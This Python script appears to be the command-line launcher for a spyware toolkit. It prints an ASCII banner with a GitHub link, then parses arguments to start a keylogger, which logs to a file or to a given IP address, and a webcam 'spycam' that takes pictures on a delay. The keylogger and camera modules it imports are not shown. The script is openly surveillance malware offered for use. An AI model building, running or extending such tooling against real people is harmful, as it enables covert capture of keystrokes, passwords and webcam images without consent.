# -*- coding: utf-8 -*-
#!/usr/bin/env python3

import sys
import re

from util import *

from keylogger import Keylogger
from spycam import takeAPicture

#----------- actif  form   val
keyloggerL = [None, None]
#----------- actif  form   val
spycamL = [False, None]

print("\n"+(" "*6)+Colors.GREEN+"╋╋╋╋┏┓┏┓╋╋╋╋╋╋╋╋┏━┓")
print((" "*6)+"┏━┳┳┫┗┫┗┳━┳━┳┳━━┫━╋━┳┳┳┳┳┳━┓┏┳┳━┓")
print((" "*6)+"┃╋┃┃┃┏┫┃┃╋┃┃┃┣━━╋━┃╋┃┃┃┃┃┃╋┗┫┏┫┻┫")
print((" "*6)+"┃┏╋┓┣━┻┻┻━┻┻━┛╋╋┗━┫┏╋┓┣━━┻━━┻┛┗━┛")
print((" "*6)+"┗┛┗━┛╋╋╋╋╋╋╋╋╋╋╋╋╋┗┛┗━┛"+Colors.ENDC)
print((" "*8)+Colors.UNDERLINE+Colors.HEADER+"https://github.com/p3titcr0c0\n"+Colors.ENDC)

if ('help' in sys.argv or '-h' in sys.argv or '--help' in sys.argv or 'h' in sys.argv):
	print(Errors.HELP)
	exit(1)

if (len(sys.argv)==1):
	print(Errors.NOARG)
	print(Errors.HELP)
	exit(1)

if ('keylogger' in sys.argv):
	index = (sys.argv.index('keylogger'))
	keyloggerL[0] = True
	try :
		if (sys.argv[index+1] != '--file' and sys.argv[index+1] != '--ip'):
			print(Errors.BADUSAGEKEYLOG)
			exit(1)
	except Exception as ex :
		print(Errors.BADUSAGEKEYLOG)
		exit(1)
	try :
		if (sys.argv[index+1] == '--ip'):
			if (re.search("[1234567890]+\.[1234567890]+\.[1234567890]+\.[1234567890]+", sys.argv[index+2]) == None):
				print(Errors.BADIP)
				exit(1)
			else :
				keyloggerL[1] = "write at "+sys.argv[index+2]
				key = Keylogger()
				key.start()

		if (sys.argv[index+1] == '--file'):
			if (re.search(".+\..+", sys.argv[index+2]) == None):
				print(Errors.BADFILE)
				exit(1)
			else :
				keyloggerL[1] = "write at './"+sys.argv[index+2]+"'"
				key = Keylogger(sys.argv[index+2])
				key.start()

	except Exception as ex :
		print(Errors.NOIP)
		exit(1)


if ('spycam' in sys.argv):
	index = (sys.argv.index('spycam'))
	try :
		if (sys.argv[index+1] != '--delay'):
			print(Errors.BADUSAGESPYCAM)
			exit(1)
	except Exception as ex :
		print(Errors.BADUSAGESPYCAM)
		exit(1)
	try :
		if (sys.argv[index+1] == '--delay'):
			if (re.search("[1234567890]+", sys.argv[index+2]) == None):
				print(Errors.BADDELAY)
				exit(1)
			else :
				mySpycam = takeAPicture(int(sys.argv[index+2]))
				mySpycam.start()
				spycamL = [True, sys.argv[index+2]]

	except Exception as ex :
		print(Errors.NODELAY)
		exit(1)

print(" ┌─────────────┬─────────────────────────┐")
print(" │  "+Colors.UNDERLINE+"Functions"+Colors.ENDC+"  │           infos         │")
print(" ├─────────────┼─────────────────────────┤")
if (keyloggerL[0]==None):
	print(" │  "+Colors.OKGREEN+"Keylogger"+Colors.ENDC+"  │         Inactive        │")
	print(" ├─────────────┼─────────────────────────┤")
else :
	print(" │  "+Colors.OKGREEN+"Keylogger"+Colors.ENDC+"  │          Active         │")
	print(" ├─────────────┤ "+keyloggerL[1])
	print(" │             │                         │")
	print(" ├─────────────┼─────────────────────────┤")
if (spycamL[0]==False):
	print(" │  "+Colors.OKGREEN+"  Spycam "+Colors.ENDC+"  │         Inactive        │")
	print(" ├─────────────┼─────────────────────────┤")
else :
	print(" │  "+Colors.OKGREEN+"  Spycam "+Colors.ENDC+"  │          Active         │")
	print(" │             │        Delay = "+spycamL[1])
	print(" ├─────────────┼─────────────────────────┤")
print(" │   "+Colors.OKGREEN+"Other"+Colors.ENDC+"     │         inactive        │")
print(" ├─────────────┤                         │")
print(" │             │                         │")
print(" │             │                         │")
print(" └─────────────┴─────────────────────────┘")
